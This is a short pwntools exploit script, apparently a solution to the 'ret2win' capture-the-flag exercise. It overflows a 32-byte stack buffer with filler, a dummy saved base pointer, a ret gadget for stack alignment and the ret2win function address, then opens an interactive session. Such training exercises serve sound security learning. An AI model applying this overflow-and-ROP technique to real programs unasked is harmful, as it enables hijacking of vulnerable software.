#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread

context.log_level = 'debug'
libc = elf = None


gs = '''
tb ret2win
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Need arg")
        exit(0)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    ### attack
    # "attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
    # 3 qwords for rop?
    ret2win_addr = p64(elf.sym.ret2win)
    old_rbp = p64(0xDEADBEEF) # not needed

    # trap - the system() hangs to to misaligned stack
    # we need to jump somewhere else first
    # a simple "ret;" gadget, no strings attached
    ret_gadget_addr = p64(0x040053e)
    fill = p8(0x90)*32 + old_rbp + ret_gadget_addr + ret2win_addr 
    send(fill)

    io.interactive()
